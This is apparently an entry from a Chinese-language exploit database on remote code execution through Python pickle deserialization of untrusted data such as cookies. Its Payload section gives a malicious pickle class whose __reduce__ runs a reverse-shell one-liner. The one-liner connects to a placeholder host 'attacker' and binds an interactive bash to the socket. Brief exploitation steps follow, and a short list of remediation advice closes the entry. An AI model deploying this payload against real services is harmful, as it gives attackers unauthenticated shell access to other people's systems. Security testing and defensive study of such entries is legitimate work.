---
id: PYTHON-UNPICKLE
title: Python Unpickle 反序列化远程代码执行漏洞
product: python
vendor: Python
version_affected: "任意版本"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["Python"]
---

## 漏洞描述

Python的pickle模块是一个流行的序列化/反序列化工具。当应用程序在没有适当验证的情况下使用pickle模块反序列化用户可控数据时，可能导致任意代码执行。

## 影响版本

- 任意使用 pickle 反序列化不可信数据的应用

## 前置条件

- 无需认证
- 目标应用使用 pickle 反序列化用户可控数据（如 Cookie）

## 利用步骤

1. 构造恶意 pickle 对象
2. 发送给目标服务器

## Payload

```python
class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return (os.system, (s,))
```

```bash
# base64 编码后发送
python3 exp.py
```

## 验证方法

```bash
# 接收反弹的 shell
```

## 修复建议

1. 不要使用 pickle 反序列化不可信数据
2. 使用 JSON 等安全序列化格式
3. 如果必须使用 pickle，设置 ` RestrictedUnpickler` 类进行安全检查
